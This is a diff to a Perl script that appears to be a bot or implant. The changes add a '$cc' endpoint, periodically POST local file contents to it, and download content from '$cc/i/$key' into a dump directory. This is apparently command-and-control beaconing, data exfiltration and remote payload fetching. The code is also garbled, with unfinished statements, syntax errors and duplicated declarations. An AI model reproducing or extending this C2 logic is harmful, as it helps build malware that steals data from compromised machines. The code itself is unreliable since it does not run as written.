@@ -8,7 +8,8 @@ use IO::Socket;
 ###############
 # NAME - purpose
 # EMBRYO ##############################
-my $name = ''; my $DONE = 'DONE';
+my $name = ''; my $cc = '';
+my $DONE = 'DONE'; my $dump = 'dump';
 my $FACE = 'FACE'; open($Ffh, '>', $FACE) or die "FACE FAIL\n"
 my $home = '/home/hive/$name'; my $HOLE = 'HOLE';
 my $BUG = 'BUG'; my $LOG = 'LOG';
@@ -56,7 +57,7 @@ while (1)
     if ($count % $RATE == 0)
     {
 # RATE ##############################
-      POST($FACE);
+      POST($FACE); POST($variable);
       WORD();
     }
   }
@@ -73,7 +74,8 @@ sub SLEEP()
   print "timeout $timeout\n"; sleep $timeout;
   close $Sfh; unlink $SLEEP;
 }
-sub TIME(){
+sub TIME()
+{
   my $t = localtime;
   my $m = split(/\s+/, $t)[1]; my $d = split(/\s+/, $t)[2];
   my $H = split(/\s+/, $t)[3]; my $h = split(/\:/, $H)[0];
@@ -82,9 +84,9 @@ sub TIME(){
 }
 sub POST()
 {
-  my $data = shift;
+  my $data = shift; my $key = popkrip();
   my $ua = useragent();
-  my $req = HTTP::Request->new(POST => $domain/$key)
+  my $req = HTTP::Request->new(POST => $cc/$key)
   $req->content($data);
   print "response ";
   print $ua->request($req)->as_string;
@@ -92,8 +94,13 @@ sub POST()
 }
 sub WORD()
 {
+  my $key = popkrip(); my $ua = useragent();
+  my $res = $ua->get("$cc/i/$key", ':content_file'=>"$dump/$key");
+  my $req = HTTP::Request->new(GET => "$cc/i/$key");
+  my $res = $ua->request($req);
+  my $cont =
   if ($a_q == '1')
-    { append_que(); }
+    { my $status = append_que(); return $status; }
   if ($s_q == '1')
     { open($Sfh, '>', $SLEEP); print "$Sfh" "$cmd{s_q}"); }  # hash{$cmd} = $value
 }
@@ -103,7 +110,7 @@ sub append_que()
   foreach (@newQUE)
     { push @QUE, $_; }
 }
-sub pop_krip()
+sub popkrip()
 {
   open($Kfh, '>', $KEYS);
   my @list = readline $Kfh; chomp @list;
